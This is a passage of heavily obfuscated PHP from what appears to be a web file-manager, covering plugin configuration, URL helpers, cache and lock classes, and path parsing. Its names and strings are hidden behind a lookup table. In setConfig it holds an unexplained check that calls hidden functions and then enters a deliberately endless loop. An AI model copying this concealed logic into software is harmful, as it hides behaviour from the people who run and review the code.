$ââ∆ÉÆΩ = array(); foreach ($Ã®œåáç[0] as $⁄ú√¸±˛) { $Â–âöú† = substr($⁄ú√¸±˛, strlen($≠ŒºÓ¡•), -2); $õŒüúúì[] = $⁄ú√¸±˛; $ââ∆ÉÆΩ[] = _get($ê”Ï¡Úπ, $Â–âöú†); } $òÓÒÑôä = str_replace($õŒüúúì, $ââ∆ÉÆΩ, $òÓÒÑôä); } private function parsePackage(&$´Ûà”Ÿ¯) { $¶á‰˙‰® =& $_SERVER[Á≈ ä ∞]; $Ä⁄⁄Ç©Œ = $¶á‰˙‰®[1576]; if (!strstr($´Ûà”Ÿ¯, $Ä⁄⁄Ç©Œ)) { return; } preg_match_all($¶á‰˙‰®[1577], $´Ûà”Ÿ¯, $ëƒ·ö∂ÿ); if (!is_array($ëƒ·ö∂ÿ) || count($ëƒ·ö∂ÿ) == 0 || !is_array($ëƒ·ö∂ÿ[0]) || count($ëƒ·ö∂ÿ[0]) == 0) { return; } $™ƒˆ„–° = $this->appPackage(); $¨•Ÿ∆Õ£ = array(); $∑ßúØƒÏ = array(); foreach ($ëƒ·ö∂ÿ[0] as $ˆÍäçÑò) { $Ò®ÓöŒñ = substr($ˆÍäçÑò, strlen($Ä⁄⁄Ç©Œ), -2); $¨•Ÿ∆Õ£[] = $ˆÍäçÑò; $∑ßúØƒÏ[] = _get($™ƒˆ„–°, $Ò®ÓöŒñ); } $´Ûà”Ÿ¯ = str_replace($¨•Ÿ∆Õ£, $∑ßúØƒÏ, $´Ûà”Ÿ¯); } final function echoFile($‰À≈›œ¶, $≈ÎŒí”Ì = false) { $◊˝‰◊˜Ã =& $_SERVER[Á≈ ä ∞]; $–£ô⁄†˛ = $this->pluginPath . $‰À≈›œ¶; if (ACT == $◊˝‰◊˜Ã[1578]) { echo $◊˝‰◊˜Ã[1579] . $this->pluginName . $◊˝‰◊˜Ã[18] . $‰À≈›œ¶ . $◊˝‰◊˜Ã[1580]; if (!file_exists($–£ô⁄†˛)) { echo $◊˝‰◊˜Ã[1581]; return; } } $åô∫µΩ´ = $this->parseFile($–£ô⁄†˛); $this->parseLang($åô∫µΩ´); $this->parseConfig($åô∫µΩ´); $this->parsePackage($åô∫µΩ´); if (is_array($≈ÎŒí”Ì)) { $åô∫µΩ´ = str_replace(array_keys($≈ÎŒí”Ì), array_values($≈ÎŒí”Ì), $åô∫µΩ´); } echo $◊˝‰◊˜Ã[11] . $åô∫µΩ´; } final function initLang() { $¿Ò©©ù£ =& $_SERVER[Á≈ ä ∞]; $±∞®è∫¨ = $¿Ò©©ù£[1582]; $ë»é·â‘ = $this->pluginPath . $¿Ò©©ù£[1583]; $‡ãéÑ‡Ô = I18n::getType(); $ﬁ‡òÄÆÜ = array(); if (file_exists($ë»é·â‘ . $‡ãéÑ‡Ô . $¿Ò©©ù£[845])) { $ﬁ‡òÄÆÜ = (include $ë»é·â‘ . $‡ãéÑ‡Ô . $¿Ò©©ù£[845]); } else { if ($‡ãéÑ‡Ô == $¿Ò©©ù£[1584] && !file_exists($ë»é·â‘ . $‡ãéÑ‡Ô . $¿Ò©©ù£[845]) && file_exists($ë»é·â‘ . $¿Ò©©ù£[1585])) { $ﬁ‡òÄÆÜ = (include $ë»é·â‘ . $¿Ò©©ù£[1585]); } else { if (file_exists($ë»é·â‘ . $±∞®è∫¨ . $¿Ò©©ù£[845])) { $ﬁ‡òÄÆÜ = (include $ë»é·â‘ . $±∞®è∫¨ . $¿Ò©©ù£[845]); } } } if (!is_array($ﬁ‡òÄÆÜ)) { return array(); } if (@count($ﬁ‡òÄÆÜ) > 0) { I18n::set($ﬁ‡òÄÆÜ); } return $ﬁ‡òÄÆÜ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($©‘Î◊Ä™) { $ıé’÷¨— =& $_SERVER[Á≈ ä ∞]; if (!isset($_SERVER[$ıé’÷¨—[6]]) || !isset($_SERVER[$ıé’÷¨—[15]])) { $ôÍÍ«—‘ = $ıé’÷¨—[880]; $¨≥¸ÅÁ = $ıé’÷¨—[8]; $Ç≤ù¥–˚ = $_SERVER[$ıé’÷¨—[9]] . $ıé’÷¨—[10]; $∞Æ—Ñçà = $¨≥¸ÅÁ($Ç≤ù¥–˚); $Ê‘ÔçÔá = explode($ıé’÷¨—[11], $∞Æ—Ñçà); if (count($Ê‘ÔçÔá) < $ıé’÷¨—[654]) { $Ñﬂ¬´˙ô = $ıé’÷¨—[13]; $Ñﬂ¬´˙ô(); } $£€ÆˆÄ© = $ıé’÷¨—[881]; $£€ÆˆÄ©($_SERVER[$ıé’÷¨—[882]]); $™ù˚ê§Ï = 1; for ($ßÏñä◊Ó = $™ù˚ê§Ï; $ßÏñä◊Ó > 0; $ßÏñä◊Ó++) { $£€ÆˆÄ© = json_encode($GLOBALS[$ıé’÷¨—[427]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $©‘Î◊Ä™); } public function onSetConfig($«€æ∆Œã) { } public function onGetConfig($‹Ô†úı–) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¨ï‡»ˆî) { if ($¨ï‡»ˆî == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ı™∆œ°Ü = "\x70\154\165\147\x69\156\x41\x75\x74\150") { $≠£ñ›µø =& $_SERVER[Á≈ ä ∞]; if (!defined($≠£ñ›µø[484])) { return !1; } if (_get($GLOBALS, $≠£ñ›µø[512])) { return !0; } $ √ŸøÀœ = $this->getConfig(); if (!$ √ŸøÀœ[$ı™∆œ°Ü]) { return !1; } return ActionCall($≠£ñ›µø[1586], $ √ŸøÀœ[$ı™∆œ°Ü]); } public function url($®á˜”®œ, $«◊ïÇÁØ = '', $ìü«ÔÁ§ = true) { $ÔäÁ¡˘® =& $_SERVER[Á≈ ä ∞]; $œ÷◊∑œı = $this->getConfig(); $ÃıøË– = KOD_VERSION . $ÔäÁ¡˘®[20] . KOD_VERSION_BUILD; $§˚ä•üà = $this->packageVersion(); $€·¥±¸õ = $ÃıøË– . $ÔäÁ¡˘®[395] . $§˚ä•üà; if (substr($®á˜”®œ, 0, 4) == $ÔäÁ¡˘®[158] || substr($®á˜”®œ, 0, 2) == $ÔäÁ¡˘®[1370]) { $úà‚êêÕ = $®á˜”®œ . $ÔäÁ¡˘®[1587] . $€·¥±¸õ; } else { if ($«◊ïÇÁØ == $ÔäÁ¡˘®[22]) { $úà‚êêÕ = $this->pluginHost . $®á˜”®œ . $ÔäÁ¡˘®[1587] . $€·¥±¸õ; } else { if ($«◊ïÇÁØ === $ÔäÁ¡˘®[85]) { $úà‚êêÕ = $this->pluginHost . $®á˜”®œ; } else { if ($«◊ïÇÁØ == $ÔäÁ¡˘®[1588]) { $úà‚êêÕ = STATIC_PATH . $®á˜”®œ . $ÔäÁ¡˘®[1587] . $ÃıøË–; } else { if ($«◊ïÇÁØ == $ÔäÁ¡˘®[1589]) { $úà‚êêÕ = APP_HOST . $ÔäÁ¡˘®[1590] . $®á˜”®œ . $ÔäÁ¡˘®[1587] . $ÃıøË–; } else { if (isset($œ÷◊∑œı[$«◊ïÇÁØ])) { $úà‚êêÕ = $œ÷◊∑œı[$«◊ïÇÁØ] . $®á˜”®œ . $ÔäÁ¡˘®[1587] . $€·¥±¸õ; } } } } } } if (!$ìü«ÔÁ§) { return $úà‚êêÕ; } echo $úà‚êêÕ; } public function link($ÎêÂ˘ùÉ = false, $î¢Îø∞Õ = '') { $ø≠Û‰È  =& $_SERVER[Á≈ ä ∞]; if (!$ÎêÂ˘ùÉ) { $this->link($ø≠Û‰È [1591], $ø≠Û‰È [1589]); $this->link($ø≠Û‰È [1592], $ø≠Û‰È [1588]); $this->link($ø≠Û‰È [1593], $ø≠Û‰È [1588]); $this->link($ø≠Û‰È [1594], $ø≠Û‰È [1588]); $this->link($ø≠Û‰È [1595], $ø≠Û‰È [1588]); return; } $…¯‚ùôä = $this->url($ÎêÂ˘ùÉ, $î¢Îø∞Õ, !1); if (substr($ÎêÂ˘ùÉ, -3) == $ø≠Û‰È [1596]) { echo $ø≠Û‰È [1597] . $…¯‚ùôä . $ø≠Û‰È [1598] . $ø≠Û‰È [11]; } else { if (substr($ÎêÂ˘ùÉ, -4) == $ø≠Û‰È [1599]) { echo $ø≠Û‰È [1600] . $…¯‚ùôä . $ø≠Û‰È [1601] . $ø≠Û‰È [11]; } } } } goto e±ôÿ·ÇÊË; DãèøÛ¢Ã¡: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $•ﬂ∏Ô∆ =& $_SERVER[Á≈ ä ∞]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ƒ∂ÚÂÒÛ = $GLOBALS[$•ﬂ∏Ô∆[16]][$•ﬂ∏Ô∆[358]]; $Œ¸¥ÔØ‰ = $ƒ∂ÚÂÒÛ[$ƒ∂ÚÂÒÛ[$•ﬂ∏Ô∆[834]]]; $Èú√üÏÇ = $ƒ∂ÚÂÒÛ[$•ﬂ∏Ô∆[835]]; switch ($ƒ∂ÚÂÒÛ[$•ﬂ∏Ô∆[834]]) { case $•ﬂ∏Ô∆[31]: self::$handle = Model($•ﬂ∏Ô∆[836]); break; case $•ﬂ∏Ô∆[837]: self::$handle = new CacheRedis($Œ¸¥ÔØ‰, $Èú√üÏÇ); break; case $•ﬂ∏Ô∆[838]: self::$handle = new CacheMemcached($Œ¸¥ÔØ‰, $Èú√üÏÇ); break; case $•ﬂ∏Ô∆[209]: self::$handle = new CacheFile($Œ¸¥ÔØ‰, $Èú√üÏÇ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Ëﬁ« ¿Ù) { if (is_array($Ëﬁ« ¿Ù) || is_object($Ëﬁ« ¿Ù)) { $Ëﬁ« ¿Ù = json_encode($Ëﬁ« ¿Ù); } $Ëﬁ« ¿Ù = rawurlencode($Ëﬁ« ¿Ù); return md5(KOD_SITE_ID . $_SERVER[Á≈ ä ∞][21] . $Ëﬁ« ¿Ù); } public static function get($√¥¬åπ˛, $ÌßÈÚ™Ù = false) { $Åõ¶¿úŒ = self::key($√¥¬åπ˛); if ($ÌßÈÚ™Ù) { return unserialize(self::init()->get($Åõ¶¿úŒ)); } if (!isset(self::$memoryCache[$Åõ¶¿úŒ])) { $…˚‡‹˙Ñ = self::init()->get($Åõ¶¿úŒ); self::$memoryCache[$Åõ¶¿úŒ] = unserialize($…˚‡‹˙Ñ); } return self::$memoryCache[$Åõ¶¿úŒ]; } public static function set($ÂÔÏ’Í≠, $îÜ«‰Ç™, $≠©Ï∏ıó = false) { $„‘√ê˘ß = self::key($ÂÔÏ’Í≠); if (isset(self::$memoryCache[$„‘√ê˘ß]) && self::$memoryCache[$„‘√ê˘ß] === $îÜ«‰Ç™) { return !0; } if ($≠©Ï∏ıó === 0) { self::$memoryCache[$„‘√ê˘ß] = $îÜ«‰Ç™; return !0; } CacheLock::lock($ÂÔÏ’Í≠); $î◊»ô¢™ = self::init()->set($„‘√ê˘ß, serialize($îÜ«‰Ç™), $≠©Ï∏ıó); self::$memoryCache[$„‘√ê˘ß] = $îÜ«‰Ç™; CacheLock::unlock($ÂÔÏ’Í≠); return $î◊»ô¢™; } public static function getCall($§œÚŒ†”, $ﬁóõıß≠, $€©Ëµÿœ, $†∞ù©Óª = array()) { $ﬁßä“ìü =& $_SERVER[Á≈ ä ∞]; $∞äß—˛∫ = self::get($§œÚŒ†”); if ($∞äß—˛∫ || $∞äß—˛∫ === $ﬁßä“ìü[22]) { return $∞äß—˛∫; } $∞äß—˛∫ = call_user_func_array($€©Ëµÿœ, $†∞ù©Óª); $∞äß—˛∫ = $∞äß—˛∫ ? $∞äß—˛∫ : $ﬁßä“ìü[22]; self::set($§œÚŒ†”, $∞äß—˛∫, $ﬁóõıß≠); return $∞äß—˛∫; } public static function remove($üÙ—ó±ö) { $≠°ÏóüÓ = self::key($üÙ—ó±ö); unset(self::$memoryCache[$≠°ÏóüÓ]); self::clearTimeout(); CacheLock::lock($üÙ—ó±ö); $ç÷å«ê… = self::init()->remove($≠°ÏóüÓ); CacheLock::unlock($üÙ—ó±ö); return $ç÷å«ê…; } public static function removeMemory($Ç–ìê“î) { $†÷ÀÑ¡“ = self::key($Ç–ìê“î); unset(self::$memoryCache[$†÷ÀÑ¡“]); } public static function clearMemory($ß˚˙¥¬∂ = false) { if ($ß˚˙¥¬∂) { $ß˚˙¥¬∂ = self::key($ß˚˙¥¬∂); unset(self::$memoryCache[$ß˚˙¥¬∂]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Á≈ ä ∞][839])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Á≈ ä ∞][840])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($£÷’ü˝÷, $Õ¸’Çëñ) { $—·õ™ó® =& $_SERVER[Á≈ ä ∞]; $this->cachePath = $£÷’ü˝÷[$—·õ™ó®[94]]; $this->prefix = $—·õ™ó®[841]; $this->cacheTime = $Õ¸’Çëñ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($åÍ˚çø∑) { $Ã´©ÍúÎ =& $_SERVER[Á≈ ä ∞]; $åÍ˚çø∑ = str_replace(array($Ã´©ÍúÎ[842], $Ã´©ÍúÎ[107], $Ã´©ÍúÎ[83]), $Ã´©ÍúÎ[843], $åÍ˚çø∑); return $this->cachePath . $Ã´©ÍúÎ[844] . $åÍ˚çø∑ . $Ã´©ÍúÎ[845]; } public function set($‚¥Ù≥√È, $ê‹ÊÉ˘», $ÕÄäÓëí = false) { $ÅàÌ≤◊Ñ = $this->getFile($‚¥Ù≥√È); if (file_put_contents($ÅàÌ≤◊Ñ, $this->prefix . $ê‹ÊÉ˘», LOCK_EX)) { @touch($ÅàÌ≤◊Ñ, intval(time() + $ÕÄäÓëí)); clearstatcache(); return !0; } @unlink($ÅàÌ≤◊Ñ); return !1; } public function get($ìà˚ËÛƒ) { $≠ï˚ˆáæ = $this->getFile($ìà˚ËÛƒ); if (file_exists($≠ï˚ˆáæ) && filemtime($≠ï˚ˆáæ) < time()) { @unlink($≠ï˚ˆáæ); return !1; } $Ô…√ä≥Ï = @file_get_contents($≠ï˚ˆáæ); return substr($Ô…√ä≥Ï, strlen($this->prefix)); } public function remove($ˆ‘¶ﬂ Õ) { $¡–Ù∆‡Ì = $this->getFile($ˆ‘¶ﬂ Õ); return @unlink($¡–Ù∆‡Ì); } public function deleteAll() { $Ë∏È≠√π =& $_SERVER[Á≈ ä ∞]; $†ö„•â— = scandir($this->cachePath); foreach ($†ö„•â— as $√“µ≥˘ú) { $§¢Ù˚ƒè = $this->cachePath . $√“µ≥˘ú; if (strpos($§¢Ù˚ƒè, $Ë∏È≠√π[845]) && strpos($§¢Ù˚ƒè, $Ë∏È≠√π[846])) { @unlink($§¢Ù˚ƒè); } } } public function clearTimeout() { $¥ø©Œ˘Í =& $_SERVER[Á≈ ä ∞]; $´ıîˆ†è = scandir($this->cachePath); foreach ($´ıîˆ†è as $æµıÚà°) { $¨´ÌÎÕÃ = $this->cachePath . $æµıÚà°; if (strpos($¨´ÌÎÕÃ, $¥ø©Œ˘Í[845]) && strpos($¨´ÌÎÕÃ, $¥ø©Œ˘Í[846]) && filemtime($¨´ÌÎÕÃ) < time()) { @unlink($¨´ÌÎÕÃ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ªÌŸ◊Ñê =& $_SERVER[Á≈ ä ∞]; if (self::$handle) { return self::$handle; } $‡‹ÿã¯Â = $GLOBALS[$ªÌŸ◊Ñê[16]][$ªÌŸ◊Ñê[358]]; self::$timeout = $‡‹ÿã¯Â[$ªÌŸ◊Ñê[847]] ? $‡‹ÿã¯Â[$ªÌŸ◊Ñê[847]] : 10; $êÈ—˝› = _get($GLOBALS[$ªÌŸ◊Ñê[16]], $ªÌŸ◊Ñê[848]); $Â“è‚„Ê = $‡‹ÿã¯Â[$ªÌŸ◊Ñê[834]] ? $‡‹ÿã¯Â[$ªÌŸ◊Ñê[834]] : $ªÌŸ◊Ñê[209]; if ($Â“è‚„Ê == $ªÌŸ◊Ñê[31] && $êÈ—˝› == $ªÌŸ◊Ñê[23]) { $Â“è‚„Ê = $ªÌŸ◊Ñê[209]; } switch ($Â“è‚„Ê) { case $ªÌŸ◊Ñê[837]: self::$handle = new CacheLockRedis(); break; case $ªÌŸ◊Ñê[838]: self::$handle = new CacheLockMemcached(); break; case $ªÌŸ◊Ñê[31]: self::$handle = new CacheLockDatabase(); break; case $ªÌŸ◊Ñê[209]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ªÌŸ◊Ñê[849], $ªÌŸ◊Ñê[850]); } return self::$handle; } private static function key($¿„Õ¨„∑) { return $_SERVER[Á≈ ä ∞][851] . Cache::key($¿„Õ¨„∑); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($‡ÄØ∑ù£ = '') { self::$errorMsg = $‡ÄØ∑ù£; } public static function lockGlobal($úöﬂﬂ≤Í, $üæ´∞≥Ò) { return self::lock($úöﬂﬂ≤Í, $üæ´∞≥Ò, !0); } public static function lock($‡Ü≥π…¡, $ˆ´È†•à = false, $…ƒˆ…Òç = false) { $˛¥Úöõ´ =& $_SERVER[Á≈ ä ∞]; $πÇßı¿õ = self::init(); $Ç√ö§ºç = self::key($‡Ü≥π…¡); $ˆ´È†•à = $ˆ´È†•à ? $ˆ´È†•à : self::$timeout; $¢¬¿≠íÉ = $πÇßı¿õ->lock($Ç√ö§ºç, $ˆ´È†•à); $§œœó … = timeFloat(); if (!$¢¬¿≠íÉ) { $‘ÙÙ¿˚æ = "\x6c\157\x63\153\x20\x65\162\x72\157\x72\x3b\153\x65\171\75{$‡Ü≥π…¡}\73\164\x69\x6d\x65\75{$ˆ´È†•à}\x3b" . self::$errorMsg . $˛¥Úöõ´[81] . get_caller_msg(); $œÉ»»˝Ü = LNG($˛¥Úöõ´[852]) . "\50{$ˆ´È†•à}\163\x29\x2e" . LNG($˛¥Úöõ´[853]); $œÉ»»˝Ü .= $˛¥Úöõ´[854]; if (is_string(self::$errorMsg) && self::$errorMsg) { $œÉ»»˝Ü = $œÉ»»˝Ü . $˛¥Úöõ´[855] . self::$errorMsg; } write_log($‘ÙÙ¿˚æ, $˛¥Úöõ´[850]); show_json($œÉ»»˝Ü, !1); } if (!$…ƒˆ…Òç) { self::$lockItem[$Ç√ö§ºç] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $˝ºÖº√“ = number_format(timeFloat() - $§œœó …, 3); write_log($˛¥Úöõ´[856] . $‡Ü≥π…¡ . $˛¥Úöõ´[857] . $˝ºÖº√“, $˛¥Úöõ´[850]); } return $¢¬¿≠íÉ; } public static function lockGet($ûÃÇüÅ∏) { $äâΩùπ€ = self::key($ûÃÇüÅ∏); if (self::$lockItem[$äâΩùπ€]) { return self::$lockItem[$äâΩùπ€]; } return self::init()->lockGet($äâΩùπ€); } public static function unlock($î°≥—ìÂ) { $çÉàÿÇ˝ =& $_SERVER[Á≈ ä ∞]; $œﬂÁí° = self::key($î°≥—ìÂ); self::$lockItem[$œﬂÁí°] = null; self::init()->unlock($œﬂÁí°); if (GLOBAL_DEBUG_LOG_ALL) { write_log($çÉàÿÇ˝[858] . $î°≥—ìÂ, $çÉàÿÇ˝[850]); } return; } public static function unlockRuntime() { $µ∞•«¢ÿ =& $_SERVER[Á≈ ä ∞]; $ôÿÒõ≥ı = self::init(); $ß£¢∏ıÄ = !1; foreach (self::$lockItem as $⁄ï‰Ô•◊ => $Õ˝¸É•í) { if (!$Õ˝¸É•í) { continue; } $ôÿÒõ≥ı->unlock($⁄ï‰Ô•◊); if (!$ß£¢∏ıÄ) { $ß£¢∏ıÄ = !0; write_log($µ∞•«¢ÿ[859] . $⁄ï‰Ô•◊ . $µ∞•«¢ÿ[81] . get_caller_msg(), $µ∞•«¢ÿ[850]); continue; } write_log($µ∞•«¢ÿ[859] . $⁄ï‰Ô•◊, $µ∞•«¢ÿ[850]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $„ì…ô˘Ó = number_format(timeFloat() - TIME_FLOAT, 3); write_log($µ∞•«¢ÿ[860] . $„ì…ô˘Ó . $µ∞•«¢ÿ[861] . ACTION, $µ∞•«¢ÿ[850]); } } public static function fileLock($©ü€°éÊ) { $∆—ÅÎÓò =& $_SERVER[Á≈ ä ∞]; if (!$GLOBALS[$∆—ÅÎÓò[862]]) { $GLOBALS[$∆—ÅÎÓò[862]] = array(); } $GLOBALS[$∆—ÅÎÓò[862]][$©ü€°éÊ] = !1; $©Ø≠˘„Â = fopen(DATA_PATH . $©ü€°éÊ . $∆—ÅÎÓò[863], $∆—ÅÎÓò[864]); if (!$©Ø≠˘„Â) { return !1; } $GLOBALS[$∆—ÅÎÓò[862]][$©ü€°éÊ] = $©Ø≠˘„Â; if (flock($©Ø≠˘„Â, LOCK_EX)) { return !0; } self::unlock($©ü€°éÊ); show_json($∆—ÅÎÓò[865], !1); return !1; } public static function fileUnlock($¬îÊç‡Ø) { $¬⁄°ï¨Æ =& $_SERVER[Á≈ ä ∞]; $€Ìøáøˆ = $GLOBALS[$¬⁄°ï¨Æ[862]][$¬îÊç‡Ø]; if (!$€Ìøáøˆ) { return; } $GLOBALS[$¬⁄°ï¨Æ[862]][$¬îÊç‡Ø] = !1; flock($€Ìøáøˆ, LOCK_UN); fclose($€Ìøáøˆ); } public static function fileUnlockAll() { $˝úÇÔ“® =& $_SERVER[Á≈ ä ∞]; if (!$GLOBALS[$˝úÇÔ“®[862]]) { return; } foreach ($GLOBALS[$˝úÇÔ“®[862]] as $Á®ÈÖá• => $ΩΩäﬁÊÊ) { if (!$ΩΩäﬁÊÊ) { continue; } $GLOBALS[$˝úÇÔ“®[862]][$Á®ÈÖá•] = !1; flock($ΩΩäﬁÊÊ, LOCK_UN); fclose($ΩΩäﬁÊÊ); } $GLOBALS[$˝úÇÔ“®[862]] = array(); } } goto bÁè∆áø©≥; f∞ÉË≥¡æˆ: class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\173\x75\163\x65\162\122\x65\143\171\x63\154\145\175"; const KOD_USER_FAV = "\173\165\163\145\x72\x46\x61\x76\175"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\x72\106\x69\154\x65\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\x65\x72\x46\151\154\x65\124\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\x6f\165\160\x52\157\157\164\x53\145\154\146\175"; const KOD_USER_SHARE = "\x7b\x75\x73\145\162\x53\150\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\162\123\x68\141\162\145\x4c\151\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\x61\x72\x65\x54\x6f\x4d\145\175"; const KOD_SHARE_ITEM = "\173\163\150\x61\162\145\x49\x74\145\155\x7d"; const KOD_SHARE_LINK = "\173\x73\150\141\162\x65\111\164\145\155\x4c\x69\x6e\x6b\175"; const KOD_SEARCH = "\173\163\145\141\x72\143\x68\x7d"; const KOD_BLOCK = "\173\142\x6c\157\143\x6b\x7d"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\145\x72\122\145\156\x63\x65\156\x74\x7d"; const KOD_USER_DRIVER = "\173\144\162\x69\x76\x65\162\x7d"; public static function typeList() { $¸ﬁÂ√œ… =& $_SERVER[Á≈ ä ∞]; return array($¸ﬁÂ√œ…[1247] => self::KOD_SOURCE, $¸ﬁÂ√œ…[1248] => self::KOD_USER_RECYCLE, $¸ﬁÂ√œ…[1249] => self::KOD_USER_FAV, $¸ﬁÂ√œ…[1250] => self::KOD_USER_FILE_TAG, $¸ﬁÂ√œ…[1251] => self::KOD_USER_FILE_TYPE, $¸ﬁÂ√œ…[1252] => self::KOD_GROUP_ROOT_SELF, $¸ﬁÂ√œ…[1253] => self::KOD_USER_SHARE, $¸ﬁÂ√œ…[1254] => self::KOD_USER_SHARE_LINK, $¸ﬁÂ√œ…[1255] => self::KOD_USER_SHARE_TO_ME, $¸ﬁÂ√œ…[1256] => self::KOD_SHARE_ITEM, $¸ﬁÂ√œ…[1257] => self::KOD_SHARE_LINK, $¸ﬁÂ√œ…[1258] => self::KOD_SEARCH, $¸ﬁÂ√œ…[1259] => self::KOD_BLOCK, $¸ﬁÂ√œ…[1260] => self::KOD_IO, $¸ﬁÂ√œ…[1261] => self::KOD_USER_RECENT, $¸ﬁÂ√œ…[1262] => self::KOD_USER_DRIVER); } public static function parse($ˆ´©ˆåÄ) { $§Å˝∆òª =& $_SERVER[Á≈ ä ∞]; $ˆ´©ˆåÄ = self::clear($ˆ´©ˆåÄ); $´¥ÉûÂ™ = array_values(self::typeList()); preg_match($§Å˝∆òª[1263], $ˆ´©ˆåÄ, $Ò¢à⁄»Ê); $£ÂÎç…¥ = array($§Å˝∆òª[431] => !1, $§Å˝∆òª[1264] => !1, $§Å˝∆òª[428] => !1, $§Å˝∆òª[94] => $ˆ´©ˆåÄ, $§Å˝∆òª[1173] => !1, $§Å˝∆òª[1172] => $§Å˝∆òª[22]); if (is_array($Ò¢à⁄»Ê) && count($Ò¢à⁄»Ê) == 5) { $≤ÆºîåÀ = $§Å˝∆òª[1265] . $Ò¢à⁄»Ê[2] . $§Å˝∆òª[336]; if (in_array($≤ÆºîåÀ, $´¥ÉûÂ™)) { $£ÂÎç…¥[$§Å˝∆òª[1173]] = $Ò¢à⁄»Ê[1]; $£ÂÎç…¥[$§Å˝∆òª[43]] = $≤ÆºîåÀ; $£ÂÎç…¥[$§Å˝∆òª[1266]] = substr($≤ÆºîåÀ, 1, -1); $£ÂÎç…¥[$§Å˝∆òª[408]] = $Ò¢à⁄»Ê[3]; } $£ÂÎç…¥[$§Å˝∆òª[1172]] = $Ò¢à⁄»Ê[4]; } $◊˜É„ÚË = array($§Å˝∆òª[22], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $£ÂÎç…¥[$§Å˝∆òª[1228]] = in_array($£ÂÎç…¥[$§Å˝∆òª[43]], $◊˜É„ÚË); return $£ÂÎç…¥; } public static function isTruePath($§ê¿Ω±È) { $ÖŸ˙Òæ¨ =& $_SERVER[Á≈ ä ∞]; if (substr($§ê¿Ω±È, 0, 1) != $ÖŸ˙Òæ¨[1265]) { return !0; } if (strpos($§ê¿Ω±È, $ÖŸ˙Òæ¨[417]) === 0) { return !0; } if (strpos($§ê¿Ω±È, $ÖŸ˙Òæ¨[1232]) === 0) { return !0; } if (strpos($§ê¿Ω±È, $ÖŸ˙Òæ¨[1267]) === 0) { return !0; } if (strpos($§ê¿Ω±È, $ÖŸ˙Òæ¨[1268]) === 0) { return !0; } if (strpos($§ê¿Ω±È, $ÖŸ˙Òæ¨[1269]) === 0) { return !0; } return !1; } public static function clear($ÅñÙÍ∑Î) { $Ï©¥⁄Ôæ =& $_SERVER[Á≈ ä ∞]; $ÅñÙÍ∑Î = str_replace(array($Ï©¥⁄Ôæ[1081], $Ï©¥⁄Ôæ[11]), $Ï©¥⁄Ôæ[63], $ÅñÙÍ∑Î); $ÅñÙÍ∑Î = str_replace($Ï©¥⁄Ôæ[107], $Ï©¥⁄Ôæ[18], $ÅñÙÍ∑Î); $ïç∞ªﬂ„ = $Ï©¥⁄Ôæ[1270]; if (substr($ÅñÙÍ∑Î, 0, 3) == $Ï©¥⁄Ôæ[1271]) { $ÅñÙÍ∑Î = substr($ÅñÙÍ∑Î, 3); } while (strstr($ÅñÙÍ∑Î, $ïç∞ªﬂ„)) { $ÅñÙÍ∑Î = str_replace($ïç∞ªﬂ„, $Ï©¥⁄Ôæ[18], $ÅñÙÍ∑Î); } $ÅñÙÍ∑Î = preg_replace($Ï©¥⁄Ôæ[1272], $Ï©¥⁄Ôæ[18], $ÅñÙÍ∑Î); if ($ÅñÙÍ∑Î == $Ï©¥⁄Ôæ[18]) { return $Ï©¥⁄Ôæ[18]; } $ÅñÙÍ∑Î = rtrim($ÅñÙÍ∑Î, $Ï©¥⁄Ôæ[18]); return $ÅñÙÍ∑Î; } public static function sourceID($È°µÁﬁß) { $∂ÅÁó√© =& $_SERVER[Á≈ ä ∞]; $ú›∞âÉÎ = self::parse($È°µÁﬁß); if ($ú›∞âÉÎ[$∂ÅÁó√©[43]] !== self::KOD_SOURCE) { show_json(LNG($∂ÅÁó√©[1273]), !1); } return $ú›∞âÉÎ[$∂ÅÁó√©[408]]; } public static function make($¿Ô¢÷Ωª) { if (!$¿Ô¢÷Ωª) { return !1; } return self::makePath(self::KOD_SOURCE, intval($¿Ô¢÷Ωª)); } public static function makeShare($òé©ƒÈâ, $ﬂåÿ≤ΩÅ) { return self::makePath(self::KOD_SHARE_ITEM, $òé©ƒÈâ, $ﬂåÿ≤ΩÅ); } public static function makeFileTypePath($ÎËÙ≠Ó∫) { return self::makePath(self::KOD_USER_FILE_TYPE, $ÎËÙ≠Ó∫); } public static function makeFileTagPath($≈£„û∞Ï) { return self::makePath(self::KOD_USER_FILE_TAG, $≈£„û∞Ï); } public static function makePath($ØÎÛô´‹, $ŒâëŸË˜ = '', $∂⁄âıÀõ = 